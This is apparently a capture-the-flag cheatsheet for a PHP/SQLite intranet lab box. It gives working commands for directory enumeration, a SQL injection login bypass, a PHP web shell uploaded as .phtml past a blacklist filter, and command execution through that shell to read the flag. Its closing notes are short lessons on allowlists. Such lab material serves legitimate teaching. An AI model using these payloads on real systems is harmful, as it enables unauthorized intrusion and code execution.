# Cheatsheet — The Intranet

## Targets

- **intranet01** — php/sqlite intranet: login → upload → RCE

## Useful commands

```bash
gobuster dir -u http://<ip>/ -w <list> -x php,txt,html
curl -s -c c.txt -d "username=admin' OR 1=1-- -&password=x" http://<ip>/

# after login — upload filter bypass
echo '<?php system($_GET["c"]); ?>' > s.phtml
curl -b c.txt -F 'doc=@s.phtml' http://<ip>/upload.php
curl 'http://<ip>/uploads/s.phtml?c=id'
curl 'http://<ip>/uploads/s.phtml?c=cat+/flag.txt'

ls /var/www/html/uploads/                  # via webshell
```

## Concepts

- Auth bypass via SQLi gives you the *authenticated attack surface*
- Blacklists enumerate what the dev *thought of* — allowlists enumerate what's safe
- www-data shells are still shells: read the whole filesystem with them
